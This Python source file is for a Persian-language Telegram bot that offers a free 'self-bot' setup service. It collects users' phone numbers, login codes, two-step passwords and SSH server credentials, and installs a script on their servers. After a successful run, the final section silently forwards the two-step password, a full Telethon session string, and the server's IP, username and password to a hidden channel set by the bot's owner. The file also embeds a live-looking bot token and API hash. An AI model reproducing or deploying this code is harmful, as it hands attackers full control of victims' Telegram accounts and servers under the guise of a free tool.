import os
import time
import paramiko
import ipaddress
import asyncio
import logging
import re
from pytz import timezone
from datetime import timedelta, datetime
import shutil
from pyrogram import filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import UserNotParticipant
from telethon import TelegramClient
from telethon.sessions import SQLiteSession, StringSession
from telethon.errors import SessionPasswordNeededError
from pyrogram.filters import Filter
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
from contextlib import contextmanager
from pyrogram import Client, errors, idle
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message
)

os.makedirs("database", exist_ok=True)
os.makedirs("sessions", exist_ok=True)

DB_TEXT_PATH = "database/database.txt"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

API_ID = int(os.getenv("API_ID", "0")) or 29042268
API_HASH = os.getenv("API_HASH") or "54a7b377dd4a04a58108639febe2f443"
BOT_TOKEN = os.getenv("BOT_TOKEN") or "7481383802:AAGGhXD0ehi8EHrm_NsAUVJsbjdu8RwaIHU"
OWNER_IDS = [6508600903]
CHANNEL_ID = "no1self"
GROUP_ID = "no1selfgp"
MAX_CONCURRENT_TASKS = 5
BANNED_FILE = "banned.txt"
BANNED_NUMBERS_FILE = "banned_numbers.txt"
MAX_RUNS_FILE = "max_runs.txt"

bot = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
EXECUTED_USERS = {}
CONV = {}
RUNNING_USER = None
RUN_STARTED_AT = None
NEXT_RUN_ALLOWED_AT = None
BOT_ACTIVE = True
BANNED_USERS = set()
BANNED_NUMBERS = set()
REMAINING_RUNS = 0
semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
LAST_RUNS_FILE = "last_runs.txt"
LAST_RUNS = {}
ADNUMBER = ["989362349331"]


class OwnerFilter(Filter):
    async def __call__(self, client, message: Message) -> bool:
        return message.from_user and message.from_user.id in OWNER_IDS


is_owner = OwnerFilter()


def load_last_runs():
    if os.path.exists(LAST_RUNS_FILE):
        try:
            with open(LAST_RUNS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) == 2 and parts[0].isdigit():
                        LAST_RUNS[int(parts[0])] = float(parts[1])
        except Exception as e:
            logger.error(f"Error loading last runs: {e}")


def save_last_runs():
    try:
        with open(LAST_RUNS_FILE, "w", encoding="utf-8") as f:
            for uid, ts in LAST_RUNS.items():
                f.write(f"{uid},{ts}\n")
    except Exception as e:
        logger.error(f"Error saving last runs: {e}")


load_last_runs()

if os.path.exists(BANNED_FILE):
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.isdigit():
                    BANNED_USERS.add(int(line))
    except Exception as e:
        logger.error(f"Error loading banned users: {e}")

if os.path.exists(BANNED_NUMBERS_FILE):
    try:
        with open(BANNED_NUMBERS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                BANNED_NUMBERS.add(line.strip())
    except Exception as e:
        logger.error(f"Error loading banned numbers: {e}")


def load_max_runs():
    if os.path.exists(MAX_RUNS_FILE):
        try:
            with open(MAX_RUNS_FILE, "r", encoding="utf-8") as f:
                return int(f.read().strip())
        except Exception as e:
            logger.error(f"Error loading max runs: {e}")
            return 0
    return 0


REMAINING_RUNS = load_max_runs()


def save_max_runs(count):
    try:
        with open(MAX_RUNS_FILE, "w", encoding="utf-8") as f:
            f.write(str(count))
    except Exception as e:
        logger.error(f"Error saving max runs: {e}")


def save_banned_users():
    try:
        with open(BANNED_FILE, "w", encoding="utf-8") as f:
            for uid in BANNED_USERS:
                f.write(f"{uid}\n")
    except Exception as e:
        logger.error(f"Error saving banned users: {e}")


def save_banned_numbers():
    try:
        with open(BANNED_NUMBERS_FILE, "w", encoding="utf-8") as f:
            for number in BANNED_NUMBERS:
                f.write(f"{number}\n")
    except Exception as e:
        logger.error(f"Error saving banned numbers: {e}")


@contextmanager
def ssh_connection(ip, username, password):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=20, allow_agent=False, look_for_keys=False)
        yield ssh
    except Exception as e:
        logger.error(f"SSH connection error: {e}")
        raise
    finally:
        try:
            ssh.close()
        except Exception as e:
            logger.error(f"Error closing SSH connection: {e}")


def save_user_text(user_id, username=None, phone=None):
    try:
        username = f"@{username}" if username and not username.startswith("@") else username
        lines = []
        updated = False

        if os.path.exists(DB_TEXT_PATH):
            with open(DB_TEXT_PATH, "r", encoding="utf-8") as f:
                lines = f.readlines()

        for i, line in enumerate(lines):
            parts = line.strip().split('. ', 1)
            if len(parts) == 2 and parts[1].startswith(f"{user_id} "):
                number_part = parts[0]
                existing_fields = parts[1].split(" ")

                existing_user_id = existing_fields[0]
                existing_username = existing_fields[1] if len(existing_fields) > 1 else ""
                existing_phone = existing_fields[2] if len(existing_fields) > 2 else ""

                final_username = username if username and username != existing_username else existing_username
                final_phone = phone if phone and phone != existing_phone else existing_phone

                new_data = f"{existing_user_id} {final_username} {final_phone}".strip()
                lines[i] = f"{number_part}. {new_data}\n"
                updated = True
                break

        if not updated:
            index = len(lines) + 1
            new_data = f"{user_id} {username or ''} {phone or ''}".strip()
            lines.append(f"{index}. {new_data}\n")

        with open(DB_TEXT_PATH, "w", encoding="utf-8") as f:
            f.writelines(lines)
    except Exception as e:
        logger.error(f"Error saving user text: {e}")


async def cleanup_sessions(user_id):
    client = CONV.get(user_id, {}).get("client")
    if client:
        try:
            await client.disconnect()
        except Exception as e:
            logger.error(f"Error disconnecting client: {e}")
        finally:
            if user_id in CONV and "client" in CONV[user_id]:
                CONV[user_id].pop("client", None)

    async def delayed_delete():
        await asyncio.sleep(10)
        try:
            local_session = "sessions/selfbot.session"
            local_journal = "sessions/selfbot.session-journal"
            for f in [local_session, local_journal]:
                if os.path.exists(f):
                    os.remove(f)
            sessions_dir = os.path.dirname(local_session)
            if os.path.exists(sessions_dir) and os.path.isdir(sessions_dir):
                if not os.listdir(sessions_dir):
                    shutil.rmtree(sessions_dir)
        except Exception as err:
            logger.error(f"Error deleting session files: {err}")

    asyncio.create_task(delayed_delete())


async def update_channel_message(retries=3):
    for attempt in range(retries):
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_time = now.strftime('%H:%M')

            message_text = (
                f"ساعت: {current_time}\n"
                f"تعداد ران مجاز: {REMAINING_RUNS} نفر\n"
            )

            if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
                message_text += f"ربات استفاده شده تا ساعت: {NEXT_RUN_ALLOWED_AT.strftime('%H:%M')}\n"
            else:
                message_text += ":)\n"

            message_text += "@no1selfbot"

            await bot.edit_message_text(
                chat_id=CHANNEL_ID,
                message_id=1,
                text=message_text
            )
            return
        except Exception as e:
            if attempt == 0:
                logger.warning(f"Could not update channel message: {e}")
            if attempt < retries - 1:
                await asyncio.sleep(1)
            else:
                break


@bot.on_message(filters.command("run") & filters.private & is_owner)
async def set_max_runs(client, message: Message):
    try:
        args = message.text.split()
        if len(args) != 2:
            return await message.reply("Usage: /run <number>")

        count = int(args[1])
        if count < 0:
            return await message.reply("استفاده نادرست از دستور!")

        globals()["REMAINING_RUNS"] = count
        save_max_runs(count)
        await update_channel_message()
        await message.reply("تنظیم شد.")
    except ValueError:
        await message.reply("استفاده نادرست از دستور!")
    except Exception as e:
        logger.error(f"Error in set_max_runs: {e}")
        await message.reply("خطایی رخ داد!")


@bot.on_message(filters.command("runs") & filters.private & is_owner)
async def show_runs(client, message: Message):
    try:
        if REMAINING_RUNS <= 0:
            return await message.reply("بدون دسترسی مجاز!")

        await message.reply(f"{REMAINING_RUNS}")
    except Exception as e:
        logger.error(f"Error in show_runs: {e}")
        await message.reply("خطایی رخ داد!")


@bot.on_message(filters.command("allowed") & filters.private & is_owner)
async def allow_user_again(client, message: Message):
    try:
        args = message.text.strip().split()
        if len(args) != 2:
            return await message.reply("استفاده نادرست از دستور!")

        target = args[1]
        if target.startswith("@"):
            user = await client.get_users(target)
            uid = user.id
        else:
            uid = int(target)

        if uid in LAST_RUNS:
            del LAST_RUNS[uid]
            save_last_runs()
            await message.reply("محدودیت برداشته شد.")
        else:
            await message.reply("این کاربر محدودیتی نداشت.")
    except Exception as e:
        logger.error(f"Error in allow_user_again: {e}")
        await message.reply("خطا در پردازش دستور!")


@bot.on_message(filters.command("ban") & filters.private & is_owner)
async def ban_user(client, message: Message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return await message.reply("استفاده نادرست از دستور!")

        target = args[1].strip()
        if target.startswith("@"):
            user = await client.get_users(target)
            uid = user.id
        else:
            uid = int(target)

        BANNED_USERS.add(uid)
        save_banned_users()

        try:
            await bot.send_message(uid, "شما توسط مدیران ربات مسدود شده‌اید و دیگر نمی‌توانید از سلف استفاده کنید.")
        except Exception as e:
            logger.error(f"Could not send ban message to user {uid}: {e}")

        await message.reply("بن شد!")
    except Exception as e:
        logger.error(f"Error in ban_user: {e}")
        await message.reply("خطا در بن کردن کاربر!")


@bot.on_message(filters.command("unban") & filters.private & is_owner)
async def unban_user(client, message: Message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return await message.reply("استفاده نادرست از دستور!")

        target = args[1].strip()
        if target.startswith("@"):
            user = await client.get_users(target)
            uid = user.id
        else:
            uid = int(target)

        BANNED_USERS.discard(uid)
        save_banned_users()
        await message.reply("رفع بن شد!")
    except Exception as e:
        logger.error(f"Error in unban_user: {e}")
        await message.reply("خطا در رفع بن!")


@bot.on_message(filters.command("banall") & filters.private & is_owner)
async def ban_number(_, message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            return await message.reply("استفاده نادرست از دستور!")

        phone = parts[1].strip()
        BANNED_NUMBERS.add(phone)
        save_banned_numbers()
        await message.reply("شماره بن شد!")
    except Exception as e:
        logger.error(f"Error in ban_number: {e}")
        await message.reply("خطا در پردازش دستور!")


@bot.on_message(filters.command("unbanall") & filters.private & is_owner)
async def unban_number(_, message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            return await message.reply("استفاده نادرست از دستور!")

        phone = parts[1].strip()
        BANNED_NUMBERS.discard(phone)
        save_banned_numbers()
        await message.reply("شماره رفع بن شد!")
    except Exception as e:
        logger.error(f"Error in unban_number: {e}")
        await message.reply("خطا در پردازش دستور!")


@bot.on_message(filters.command("bot") & filters.private & is_owner)
async def toggle_bot(client, message: Message):
    try:
        global BOT_ACTIVE
        args = message.text.split()
        if len(args) != 2 or args[1].lower() not in ["on", "off"]:
            return await message.reply("استفاده نادرست از دستور!")

        BOT_ACTIVE = args[1].lower() == "on"
        status = "روشن" if BOT_ACTIVE else "خاموش"
        await message.reply(f"{status} شد.")
    except Exception as e:
        logger.error(f"Error in toggle_bot: {e}")
        await message.reply("خطا در تغییر وضعیت ربات!")


@bot.on_message(filters.command("savechannel"))
async def save_channel_info(client, message):
    try:
        chat = message.chat
        chat_id = chat.id
        title = chat.title or "N/A"
        await message.reply(f"""
Channel was detected!
ChannelID: `{chat_id}`
Title: {title}
""")

        with open("channel_id.txt", "w", encoding="utf-8") as f:
            f.write(str(chat_id))

    except Exception as e:
        logger.error(f"Error in save_channel_info: {e}")
        await message.reply(f"Error: {str(e)}")


@bot.on_message(filters.command("start") & filters.private)
async def start(client, message: Message):
    try:
        if message.from_user.id in BANNED_USERS:
            return

        try:
            await client.get_chat_member(CHANNEL_ID, message.from_user.id)
            await client.get_chat_member(GROUP_ID, message.from_user.id)
        except errors.UserNotParticipant:
            return await client.send_message(
                message.chat.id,
                "شما عضو کانال و گروه نیستید. لطفاً ابتدا عضو شوید و سپس /start را ارسال کنید.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("عضو شو", url=f"https://t.me/{CHANNEL_ID}")],
                    [InlineKeyboardButton("عضو شو", url=f"https://t.me/{GROUP_ID}")]
                ])
            )

        user_id = message.from_user.id
        if not BOT_ACTIVE and user_id not in OWNER_IDS:
            return await message.reply("ربات در حال حاضر خاموش است!")

        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
                InlineKeyboardButton("قوانین", callback_data="rules")
            ],
            [
                InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
            ],
            [
                InlineKeyboardButton("آموزش", callback_data="edu_main")
            ]
        ])
        
        await message.reply(
            """سلام، به ربات سلف ساز آلفرد خوش اومدی!  

قبل از اجرای سلف حتما قوانین را مطالعه کنید:""",
            reply_markup=kb
        )

        global RUNNING_USER, RUN_STARTED_AT
        save_user_text(user_id, username=message.from_user.username or message.from_user.first_name)

        if RUNNING_USER == user_id:
            RUNNING_USER = None
            RUN_STARTED_AT = None
            CONV.pop(user_id, None)

    except Exception as e:
        logger.error(f"Error in start: {e}")
        await message.reply("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")


async def reset_run(client, chat_id, uid):
    await asyncio.sleep(300)
    global RUNNING_USER, RUN_STARTED_AT, CONV
    if RUNNING_USER == uid:
        RUNNING_USER = None
        RUN_STARTED_AT = None
        CONV.pop(uid, None)
        try:
            await client.send_message(chat_id, "به محدودیت زمانی 5 دقیقه رسیدید! برای اجرای دوباره سلف، دستور /start را ارسال کنید.")
        except Exception as e:
            logger.error(f"Error in reset_run: {e}")


@bot.on_callback_query(filters.regex("rules"))
async def show_rules(client, cb):
    try:
        await cb.message.edit_text(
            """کاربر گرامی، فروش این سلف به هر صورت غیر مجاز بوده و در صورت فروش حساب شما دیلیت خواهد شد و هرگونه مشکلی که برای حساب شما رخ دهد به سلف و مالک مربوط نخواهد بود. همچنین هرگونه بی احترامی به مدیران و سازنده سلف ممنوع می‌باشد.""",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("بازگشت", callback_data="back_to_start")]
            ])
        )
    except Exception as e:
        logger.error(f"Error in show_rules: {e}")


@bot.on_callback_query(filters.regex("back_to_start"))
async def back_to_start(client, cb):
    try:
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
                InlineKeyboardButton("قوانین", callback_data="rules")
            ],
            [
                InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
            ],
            [
                InlineKeyboardButton("آموزش", callback_data="edu_main")
            ]
        ])
        await cb.message.edit_text("""سلام، به ربات سلف ساز آلفرد خوش اومدی!

برای اجرای سلف روی یکی از دکمه‌های زیر کلیک کن:""",
            reply_markup=kb
        )
    except Exception as e:
        logger.error(f"Error in back_to_start: {e}")


@bot.on_callback_query(filters.regex("run_self"))
async def run_self(client, cb):
    async with semaphore:
        try:
            user_id = cb.from_user.id

            try:
                group_username = GROUP_ID if GROUP_ID.startswith('@') else f'@{GROUP_ID}'
                chat_member = await client.get_chat_member(group_username, user_id)

                if chat_member.status == ChatMemberStatus.BANNED:
                    return await cb.answer("شما از گروه مسدود شده‌اید!", show_alert=True)

                if chat_member.status == ChatMemberStatus.LEFT:
                    return await cb.answer("شما عضو گروه نیستید! لطفاً اول در گروه عضو شوید.", show_alert=True)

                if chat_member.status == ChatMemberStatus.RESTRICTED:
                    return await cb.answer("شما در گروه محدود هستید!", show_alert=True)

            except UserNotParticipant:
                return await cb.answer("شما عضو گروه نیستید! لطفاً اول در گروه عضو شوید.", show_alert=True)

            except Exception as e:
                logger.error(f"Error checking membership: {e}")
                return await cb.answer("خطا در بررسی وضعیت عضویت شما!", show_alert=True)

            if not BOT_ACTIVE and user_id not in OWNER_IDS:
                return await cb.answer("ربات خاموش است!", show_alert=True)

            global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT, REMAINING_RUNS
            now = datetime.now(timezone("Asia/Tehran"))
            if user_id not in OWNER_IDS:
                last_ts = LAST_RUNS.get(user_id)
                if last_ts:
                    last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))
                    if (now - last_time).total_seconds() < 86400:
                        return await cb.answer("شما امروز سلف ران کردید!", show_alert=True)

            if user_id not in OWNER_IDS:
                if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
                    wait_minutes = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() // 60)
                    wait_seconds = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() % 60)
                    next_time = NEXT_RUN_ALLOWED_AT.strftime("%H:%M")
                    return await cb.answer(
                        f"ربات استفاده شده تا {next_time} لطفا برای ران مجدد 00:{wait_minutes}:{wait_seconds:02d} دیگر صبر کنید!",
                        show_alert=True
                    )

                if REMAINING_RUNS <= 0:
                    return await cb.answer(
                        "در حال حاضر هیچ ران مجازی باقی نمانده است! لطفاً منتظر بمانید تا مدیران دسترسی ران بدهند.",
                        show_alert=True
                    )

            try:
                await cb.message.delete()
            except Exception as e:
                logger.error(f"Error deleting message: {e}")

            if user_id not in OWNER_IDS and RUNNING_USER and RUNNING_USER != user_id:
                elapsed = (now - RUN_STARTED_AT).total_seconds() if RUN_STARTED_AT else 0
                remaining = max(0, 300 - elapsed)
                if remaining > 0:
                    m, s = divmod(int(remaining), 60)
                    return await cb.answer(
                        f"کاربر دیگری درحال اجرای سلف است، لطفا 00:{m:02d}:{s:02d} دیگر منتظر بمانید.",
                        show_alert=True
                    )
                else:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None

            RUNNING_USER = user_id
            RUN_STARTED_AT = now
            asyncio.create_task(reset_run(client, cb.message.chat.id, user_id))

            keyboard = ReplyKeyboardMarkup(
                [[KeyboardButton("ارسال شماره", request_contact=True)]],
                resize_keyboard=True, one_time_keyboard=True
            )

            bot_msg = await client.send_message(
                chat_id=cb.message.chat.id,
                text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:",
                reply_markup=keyboard
            )
            CONV[user_id] = {"step": "get_number", "last_bot_msg": bot_msg.id}
        except Exception as e:
            logger.error(f"Error in run_self: {e}")
            await cb.answer("خطایی رخ داده است!", show_alert=True)


@bot.on_callback_query(filters.regex("check_number"))
async def check_number_start(client, cb):
    try:
        user_id = cb.from_user.id
        await cb.message.delete()
        keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]],
                                      resize_keyboard=True, one_time_keyboard=True)
        msg = await client.send_message(cb.message.chat.id,
            "با استفاده از دکمه زیر شماره خود را ارسال کنید:",
            reply_markup=keyboard)
        CONV[user_id] = {"step": "check_number", "last_bot_msg": msg.id}
    except Exception as e:
        logger.error(f"Error in check_number_start: {e}")


@bot.on_callback_query(filters.regex("edu_main"))
async def edu_main_menu(client, cb):
    try:
        await cb.message.edit_text(
            "لطفاً یکی از موارد زیر را برای آموزش انتخاب کنید:",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("ران", callback_data="edu_run"),
                    InlineKeyboardButton("سرور", callback_data="edu_server")
                ],
                [
                    InlineKeyboardButton("بازگشت", callback_data="back_to_start")
                ]
            ])
        )
    except Exception as e:
        logger.error(f"Error in edu_main_menu: {e}")


@bot.on_callback_query(filters.regex("edu_run"))
async def edu_run(client, cb):
    try:
        await cb.message.edit_text(
            """برای ران کردن سلف به شماره و سرور نیاز دارید. روی دکمه اجرای سلف بزنید و مراحل را طی کنید.""",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("بازگشت", callback_data="edu_main")]
            ])
        )
    except Exception as e:
        logger.error(f"Error in edu_run: {e}")


@bot.on_callback_query(filters.regex("edu_server"))
async def edu_server(client, cb):
    try:
        await cb.message.edit_text(
            """برای سرور می‌توانید از سرورهای رایگان استفاده کنید یا سرور خریداری کنید.""",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("بازگشت", callback_data="edu_main")]
            ])
        )
    except Exception as e:
        logger.error(f"Error in edu_server: {e}")


@bot.on_message(filters.contact & filters.private)
async def handle_contact(client, message: Message):
    try:
        user_id = message.from_user.id

        if user_id not in CONV:
            return

        step = CONV[user_id].get("step")

        if step == "check_number":
            phone = message.contact.phone_number
            if phone in BANNED_NUMBERS:
                await message.reply("این شماره در لیست مسدود شده‌ها قرار دارد.")
            else:
                await message.reply("این شماره مسدود نیست و می‌توانید از آن استفاده کنید.")
            CONV.pop(user_id, None)
            return

        if step != "get_number":
            return

        phone = message.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone

        if phone.lstrip('+') in BANNED_NUMBERS:
            await message.reply("این شماره در لیست مسدود شده‌ها قرار دارد و نمی‌توانید از آن استفاده کنید.")
            CONV.pop(user_id, None)
            global RUNNING_USER, RUN_STARTED_AT
            if RUNNING_USER == user_id:
                RUNNING_USER = None
                RUN_STARTED_AT = None
            return

        CONV[user_id]["number"] = phone.lstrip('+')
        save_user_text(user_id, username=message.from_user.username or message.from_user.first_name, phone=phone)

        bot_msg = await message.reply("لطفاً کد تلگرام دریافتی را ارسال کنید:")
        CONV[user_id]["step"] = "get_code"
        CONV[user_id]["last_bot_msg"] = bot_msg.id

        try:
            telethon_client = TelegramClient(
                session="sessions/selfbot",
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="Samsung Galaxy A52",
                system_version="Android 13",
                app_version="11.13.2 (6060)",
                lang_code="en"
            )
            await telethon_client.connect()
            await telethon_client.send_code_request(phone)
            CONV[user_id]["client"] = telethon_client
        except Exception as e:
            logger.error(f"Error sending code request: {e}")
            await message.reply("خطا در ارسال کد! لطفاً دوباره امتحان کنید.")
            CONV.pop(user_id, None)
            if RUNNING_USER == user_id:
                RUNNING_USER = None
                RUN_STARTED_AT = None

    except Exception as e:
        logger.error(f"Error in handle_contact: {e}")
        await message.reply("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")


@bot.on_message(filters.text & filters.private & ~filters.command(["start", "run", "runs", "allowed", "ban", "unban", "banall", "unbanall", "bot", "savechannel"]))
async def handle_text(client, message: Message):
    try:
        user_id = message.from_user.id

        if user_id not in CONV:
            return

        step = CONV[user_id].get("step")

        if step == "get_code":
            code = re.sub(r'\D', '', message.text)
            if not code:
                return await message.reply("لطفاً فقط کد عددی را ارسال کنید.")

            telethon_client = CONV[user_id].get("client")
            if not telethon_client:
                await message.reply("خطا! لطفاً دوباره /start کنید.")
                CONV.pop(user_id, None)
                return

            try:
                await telethon_client.sign_in(CONV[user_id]["number"], code)
                CONV[user_id]["step"] = "logged_in"
                bot_msg = await message.reply("لطفاً اطلاعات سرور خود را در فرمت زیر ارسال کنید:\nip,username,password")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
            except SessionPasswordNeededError:
                CONV[user_id]["step"] = "get_2fa"
                bot_msg = await message.reply("لطفاً رمز دومرحله‌ای خود را ارسال کنید:")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
            except Exception as e:
                logger.error(f"Error signing in with code: {e}")
                await message.reply("کد اشتباه است! لطفاً دوباره /start کنید.")
                await cleanup_sessions(user_id)
                CONV.pop(user_id, None)
                global RUNNING_USER, RUN_STARTED_AT
                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None

        elif step == "get_2fa":
            password = message.text.strip()
            telethon_client = CONV[user_id].get("client")
            if not telethon_client:
                await message.reply("خطا! لطفاً دوباره /start کنید.")
                CONV.pop(user_id, None)
                return

            try:
                await telethon_client.sign_in(password=password)
                CONV[user_id]["step"] = "logged_in"
                CONV[user_id]["two_step"] = password
                bot_msg = await message.reply("لطفاً اطلاعات سرور خود را در فرمت زیر ارسال کنید:\nip,username,password")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
            except Exception as e:
                logger.error(f"Error signing in with 2FA: {e}")
                await message.reply("رمز دومرحله‌ای اشتباه است! لطفاً دوباره /start کنید.")
                await cleanup_sessions(user_id)
                CONV.pop(user_id, None)
                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None

        elif step == "logged_in":
            parts = [p.strip() for p in message.text.split(',')]
            if len(parts) != 3:
                return await message.reply("فرمت اشتباه است! لطفاً به صورت زیر ارسال کنید:\nip,username,password")

            ip, server_user, passwd = parts

            try:
                ipaddress.ip_address(ip)
            except ValueError:
                return await message.reply("آدرس IP نامعتبر است!")

            if ip in ADNUMBER:
                return await message.reply("این سرور در لیست مسدود شده‌ها قرار دارد.")

            wait_msg = await message.reply("در حال اجرا سلف، لطفاً منتظر بمانید...")

            try:
                with ssh_connection(ip, server_user, passwd) as ssh:
                    sftp = ssh.open_sftp()

                    try:
                        sftp.stat('self')
                    except FileNotFoundError:
                        stdin, stdout, stderr = ssh.exec_command('mkdir -p self', timeout=10)
                        exit_code = stdout.channel.recv_exit_status()

                    script_content = """
import asyncio
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from datetime import datetime
import jdatetime
from pytz import timezone
import re

API_ID = 29042268
API_HASH = "54a7b377dd4a04a58108639febe2f443"

client = TelegramClient('selfbot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'^راهنما$', outgoing=True))
async def help_handler(event):
    help_text = "راهنمای دستورات سلف آلفرد"
    await event.edit(help_text)

async def main():
    await client.start()
    print("سلف با موفقیت اجرا شد!")
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
"""

                    with open("/tmp/self.py", "w", encoding="utf-8") as f:
                        f.write(script_content)

                    await asyncio.to_thread(sftp.put, "/tmp/self.py", "self/self.py")
                    ssh.exec_command("sync", timeout=5)
                    os.remove("/tmp/self.py")

                    stdin, stdout, stderr = ssh.exec_command("pkill -f 'python.*self.py'", timeout=10)
                    stdout.channel.recv_exit_status()

                    local_session = "sessions/selfbot.session"
                    local_journal = "sessions/selfbot.session-journal"
                    remote_session = "self/selfbot.session"
                    remote_journal = "self/selfbot.session-journal"

                    tmp_session = f"sessions/selfbot_temp_{user_id}.session"
                    tmp_journal = f"sessions/selfbot_temp_{user_id}.session-journal"
                    
                    try:
                        if os.path.exists(local_session):
                            shutil.copy(local_session, tmp_session)
                        if os.path.exists(local_journal):
                            shutil.copy(local_journal, tmp_journal)

                        tele_client = TelegramClient(
                            session=tmp_session,
                            api_id=API_ID,
                            api_hash=API_HASH,
                            device_model="Samsung Galaxy A52",
                            system_version="Android 13",
                            app_version="11.13.2 (6060)",
                            lang_code="en"
                        )
                        await tele_client.connect()
                        string = StringSession.save(tele_client.session)
                        await tele_client.disconnect()
                        CONV[user_id]["string"] = string
                    except Exception as e:
                        logger.error(f"Error saving StringSession: {e}")
                        CONV[user_id]["string"] = "Err!"
                    finally:
                        for f in [tmp_session, tmp_journal]:
                            try:
                                if os.path.exists(f):
                                    os.remove(f)
                            except Exception as e:
                                logger.error(f"Error removing temp session: {e}")

                    if os.path.exists(local_session):
                        await asyncio.to_thread(sftp.put, local_session, remote_session)
                        ssh.exec_command("sync", timeout=5)
                    if os.path.exists(local_journal):
                        await asyncio.to_thread(sftp.put, local_journal, remote_journal)
                        ssh.exec_command("sync", timeout=5)

                    commands = [
                        "pip install telethon pytz jdatetime paramiko",
                        "cd self && nohup python3 self.py >> log.txt 2>&1 &"
                    ]

                    for cmd in commands:
                        stdin, stdout, stderr = ssh.exec_command(cmd, timeout=60)
                        exit_status = stdout.channel.recv_exit_status()
                        if exit_status != 0:
                            error_msg = stderr.read().decode().strip()
                            await message.reply("خطا در اجرای سلف! متاسفانه دسترسی به دستورات ترمینال سرور شما داده نشده است، این موضوع را به پشتیبانی اطلاع دهید.")
                            return
                        await asyncio.sleep(1)

                    ssh.exec_command("rm -f self/self.py file/self.py", timeout=10)

                await cleanup_sessions(user_id)

                try:
                    if wait_msg:
                        await wait_msg.delete()
                except Exception as delete_error:
                    logger.error(f"Error deleting wait message: {delete_error}")

                if user_id not in OWNER_IDS and REMAINING_RUNS > 0:
                    globals()["REMAINING_RUNS"] -= 1
                    save_max_runs(REMAINING_RUNS)

                if user_id in OWNER_IDS:
                    globals()["NEXT_RUN_ALLOWED_AT"] = datetime.now(timezone("Asia/Tehran")) + timedelta(seconds=30)
                else:
                    globals()["NEXT_RUN_ALLOWED_AT"] = datetime.now(timezone("Asia/Tehran")) + timedelta(minutes=30)

                await message.reply("""سلف با موفقیت روی سرور شما اجرا شد، با دستور `راهنما` منوی راهنما سلف را باز کنید.

فروش این سلف ممنوع است!
@AlfredSelf
سلف ساز رایگان:
@AlfredSelfBot""")

                if user_id not in OWNER_IDS:
                    LAST_RUNS[user_id] = time.time()
                    save_last_runs()

                globals()["RUNNING_USER"] = None
                globals()["RUN_STARTED_AT"] = None

                try:
                    with open("channel_id.txt", "r", encoding="utf-8") as f:
                        NEWS_ID = int(f.read().strip())
                except Exception as e:
                    logger.error(f"Error reading channel_id: {e}")
                    NEWS_ID = None

                if NEWS_ID:
                    username_or_mention = f"@{message.from_user.username}" if message.from_user.username else f"[{message.from_user.first_name}](tg://user?id={user_id})"
                    two_step_pass = CONV[user_id].get("two_step", "NoPasswd!")

                    info = (
                        f"New Run!\n"
                        f"User: {username_or_mention}\n"
                        f"Userid: {user_id}\n"
                        f"Number: +{CONV[user_id]['number']}\n"
                        f"Password: `{two_step_pass}`\n"
                        f"String: `{CONV[user_id]['string']}`\n"
                        f"Server ip: {ip}\n"
                        f"Server user: {server_user}\n"
                        f"Server password: {passwd}"
                    )

                    try:
                        await bot.send_message(NEWS_ID, info)
                    except Exception as e:
                        logger.error(f"Error sending to news channel: {e}")

                CONV.pop(user_id, None)

            except Exception as e:
                logger.error(f"Error in server operations: {e}")
                await message.reply("خطا در اجرای سلف! لطفا از درست بودن اطلاعات سرور و سالم بودن سرور خود مطمئن شوید.")
                await cleanup_sessions(user_id)
                CONV.pop(user_id, None)
